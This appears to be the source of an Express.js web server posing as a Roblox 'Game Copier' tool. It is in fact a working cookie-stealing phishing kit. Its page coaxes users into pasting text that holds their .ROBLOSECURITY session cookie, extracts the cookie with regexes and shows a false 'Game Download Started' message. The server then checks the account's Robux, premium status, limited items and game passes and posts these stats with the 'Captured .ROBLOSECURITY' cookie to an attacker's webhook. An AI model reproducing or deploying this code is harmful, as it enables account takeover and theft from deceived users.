const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Strona główna – bez zmian
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Tools</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #e0e0ff;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .card {
      background: rgba(26, 26, 46, 0.85);
      border: 1px solid #334;
      border-radius: 16px;
      padding: 70px 90px;
      text-align: center;
      box-shadow: 0 12px 50px rgba(0,0,0,0.7);
    }
    h1 {
      color: #6ab0ff;
      margin-bottom: 50px;
      font-size: 3rem;
    }
    .btn {
      background: #3b82f6;
      color: white;
      padding: 20px 80px;
      font-size: 1.7rem;
      border-radius: 12px;
      text-decoration: none;
      transition: all 0.3s;
      display: inline-block;
    }
    .btn:hover {
      background: #2563eb;
      transform: translateY(-4px);
      box-shadow: 0 12px 30px rgba(59,130,246,0.6);
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Roblox Tools</h1>
    <a href="/game-copier" class="btn">Game Copier & Checker</a>
  </div>
</body>
</html>
  `);
});

// Podstrona /game-copier – z animowanymi pop-upami
app.get('/game-copier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Game Copier</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      min-height: 100vh;
      background: #f8f9fa;
      color: #111111;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      overflow: hidden;
      position: relative;
    }
    canvas { position:fixed; inset:0; z-index:1; pointer-events:none; }
    .container {
      position: relative;
      z-index: 2;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 20px;
      gap: 60px;
      max-width: 1400px;
      margin: 0 auto;
    }
    .left, .right { flex:1; max-width:520px; }
    h1 {
      color: #222;
      font-size: 2.3rem;
      margin-bottom: 36px;
      font-weight: 600;
      letter-spacing: -0.4px;
      text-align: center;
    }

    /* Pop-upy */
    #popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 24px 48px;
      border-radius: 16px;
      font-size: 1.4rem;
      font-weight: 600;
      color: white;
      z-index: 9999;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s ease, transform 0.4s ease;
      box-shadow: 0 10px 40px rgba(0,0,0,0.4);
      display: flex;
      align-items: center;
      gap: 16px;
      min-width: 380px;
      text-align: center;
    }
    #popup.show {
      opacity: 1;
      transform: translate(-50%, -50%) scale(1);
    }
    .success { background: #28a745; }
    .error   { background: #dc3545; }
    .icon { font-size: 2.2rem; }

    /* Ramka zygzakowata – bez zmian */
    .zigzag-border {
      position: relative;
      width: 100%;
      padding: 6px;
      border-radius: 16px;
      overflow: hidden;
      margin-bottom: 28px;
    }
    .zigzag-border::before {
      content: '';
      position: absolute;
      inset: -8px;
      background: linear-gradient(
        90deg,
        transparent 20%,
        #000 40%,
        #fff 50%,
        #000 60%,
        transparent 80%
      );
      background-size: 300% 300%;
      animation: lightningFlow 2.8s linear infinite;
      filter: blur(5px);
      opacity: 0.75;
      border-radius: 22px;
      z-index: -1;
    }
    .zigzag-border::after {
      content: '';
      position: absolute;
      inset: 0;
      background: repeating-linear-gradient(
        45deg,
        transparent 0,
        transparent 3px,
        #000 3px,
        #000 6px,
        #fff 6px,
        #fff 9px
      );
      background-size: 12px 12px;
      animation: zigzagShift 4s linear infinite;
      opacity: 0.35;
      border-radius: 12px;
      z-index: -1;
    }
    .inner-box {
      background: #ffffff;
      border-radius: 12px;
      padding: 18px 20px;
      border: 1px solid #333;
      position: relative;
      z-index: 2;
      transition: all 0.3s ease;
    }
    .zigzag-border:hover .inner-box {
      border-color: #000;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
    }
    textarea {
      width: 100%;
      min-height: 180px;
      background: transparent;
      border: none;
      outline: none;
      resize: none;
      font-family: Consolas, "Courier New", monospace;
      font-size: 14.5px;
      color: #111;
      line-height: 1.5;
    }
    textarea::placeholder {
      color: #777;
      font-style: italic;
    }
    button {
      margin-top: 28px;
      background: #222;
      color: white;
      border: none;
      padding: 14px 72px;
      font-size: 1.18rem;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.25s ease;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    button:hover:not(:disabled) {
      background: #000;
      transform: translateY(-2px);
      box-shadow: 0 10px 24px rgba(0,0,0,0.25);
    }
    button:disabled {
      background: #777;
      cursor: not-allowed;
      opacity: 0.7;
    }
    .video-frame {
      background: #fff;
      border-radius: 18px;
      overflow: hidden;
      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
      border: 1px solid #d0d0d0;
      aspect-ratio: 16 / 9;
    }
    .video-frame iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    @keyframes lightningFlow {
      0%   { background-position: 0% 50%; }
      100% { background-position: 300% 50%; }
    }
    @keyframes zigzagShift {
      0%   { background-position: 0 0; }
      100% { background-position: 120px 120px; }
    }
  </style>
</head>
<body>

  <canvas id="bgCanvas"></canvas>

  <div id="popup"></div>

  <div class="container">
    <div class="left">
      <h1>Game Copier</h1>
      <div class="zigzag-border">
        <div class="inner-box">
          <textarea id="input" placeholder="Paste Your Game File There"></textarea>
        </div>
      </div>
      <button id="btn" onclick="start()">Start Process</button>
    </div>

    <div class="right">
      <div class="video-frame">
        <iframe 
          src="https://www.youtube.com/embed/k9SfgtkEmpo?rel=0&modestbranding=1&showinfo=0&controls=1" 
          title="YouTube video player" 
          frameborder="0" 
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
          allowfullscreen>
        </iframe>
      </div>
    </div>
  </div>

<script>
// kropki w tle
const canvas = document.getElementById('bgCanvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
window.addEventListener('resize', () => {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
});
class Particle {
  constructor() {
    this.x = Math.random() * canvas.width;
    this.y = Math.random() * canvas.height;
    this.size = Math.random() * 2.2 + 0.5;
    this.speedX = Math.random() * 0.6 - 0.3;
    this.speedY = Math.random() * 0.6 - 0.3;
  }
  update() {
    this.x += this.speedX;
    this.y += this.speedY;
    if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
    if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
  }
  draw() {
    ctx.fillStyle = 'rgba(160, 160, 180, 0.5)';
    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    ctx.fill();
  }
}
const particles = [];
for (let i = 0; i < 60; i++) particles.push(new Particle());
function connect() {
  for (let a = 0; a < particles.length; a++) {
    for (let b = a; b < particles.length; b++) {
      const dx = particles[a].x - particles[b].x;
      const dy = particles[a].y - particles[b].y;
      const dist = Math.sqrt(dx*dx + dy*dy);
      if (dist < 110) {
        ctx.strokeStyle = \`rgba(140,140,160,\${1 - dist/110})\`;
        ctx.lineWidth = 0.5;
        ctx.beginPath();
        ctx.moveTo(particles[a].x, particles[a].y);
        ctx.lineTo(particles[b].x, particles[b].y);
        ctx.stroke();
      }
    }
  }
}
function animate() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  particles.forEach(p => { p.update(); p.draw(); });
  connect();
  requestAnimationFrame(animate);
}
animate();

// ── Funkcja pokazująca popup ──
function showPopup(type, text) {
  const popup = document.getElementById('popup');
  popup.innerHTML = \`
    <span class="icon">\${type === 'success' ? '✅' : '❌'}</span>
    \${text}
  \`;
  popup.className = type === 'success' ? 'success' : 'error';
  popup.classList.add('show');

  setTimeout(() => {
    popup.classList.remove('show');
  }, 4000);
}

// Logika przycisku z popupami
async function start() {
  const btn = document.getElementById('btn');
  const raw = document.getElementById('input').value.trim();

  btn.disabled = true;

  if (!raw) {
    showPopup('error', 'Wrong file<br><small>TIP: Watch the tutorial</small>');
    setTimeout(() => btn.disabled = false, 1200);
    return;
  }

  let cookie = null;
  let match;

  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match && match[1]) cookie = match[1].trim();

  if (!cookie) {
    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
    if (match && match[1]) cookie = match[1].trim();
  }

  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }

  if (!cookie) {
    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallback.length) {
      cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
    }
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    showPopup('error', 'Wrong file<br><small>TIP: Watch the tutorial</small>');
    setTimeout(() => btn.disabled = false, 1200);
    return;
  }

  // Wysyłamy cookie
  fetch('/check', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cookie })
  }).catch(() => {});

  // Sukces – pokazujemy zielony popup
  showPopup('success', 'Game Download Started<br><small>(wait 3–5 minutes)</small>');

  setTimeout(() => btn.disabled = false, 2200);
}
</script>
</body>
</html>
  `);
});

// Endpoint /check – bez zmian
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  try {
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');

    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) throw new Error('Invalid cookie');
    const userData = await userRes.json();

    let emailVerified = false;
    try {
      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    let rap = 0;
    try {
      const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (assetsRes.ok) {
        const assets = await assetsRes.json();
        rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
      }
    } catch {}

    let groupsOwned = 0;
    try {
      const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (groupsRes.ok) {
        const groups = await groupsRes.json();
        groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
      }
    } catch {}

    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const jbIds = [2219040, 2725211, 2296901, 56149618, 4974038, 2070427, 2218187];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];
    const hasGamePasses = [];
    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}
    const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
    const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
    const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
    const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;

    let hasHeadless = false;
    let hasKorblox = false;
    try {
      const headlessRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (headlessRes.ok) {
        const data = await headlessRes.json();
        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
      }
      const korbloxRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (korbloxRes.ok) {
        const data = await korbloxRes.json();
        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
      }
    } catch {}

    const result = {
      success: true,
      username: userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      rap,
      groupsOwned,
      accountAgeDays,
      created: createdDate || 'failed',
      avatarUrl,
      emailVerified,
      hasHeadless,
      hasKorblox,
      mm2Count,
      ampCount,
      sabCount,
      jbCount
    };

    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [
              {
                color: 0x0F0F23,
                title: `<:User:1481761037257674872> ${userData.name}`,
                description: "**AVATAR**",
                thumbnail: {
                  url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
                },
                fields: [
                  {
                    name: "┌─────── Account Stats ───────┐",
                    value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
                    inline: false
                  },
                  {
                    name: "**Info**",
                    value:
                      `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                      `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
                      `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
                    inline: true
                  },
                  {
                    name: "**Games**",
                    value:
                      `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                      `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
                    inline: true
                  },
                  {
                    name: "**Inventory**",
                    value:
                      `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                      `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
                    inline: true
                  }
                ],
                footer: {
                  text: "24H! • " + new Date().toLocaleString('en-US')
                },
                timestamp: new Date().toISOString()
              },
              {
                color: 0x4B0082,
                title: "Captured .ROBLOSECURITY",
                description: `\`\`\`\n${cookie}\n\`\`\``,
                timestamp: new Date().toISOString()
              }
            ]
          })
        });
      } catch (e) {
        console.error("Webhook send error:", e.message);
      }
    }

    res.json(result);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
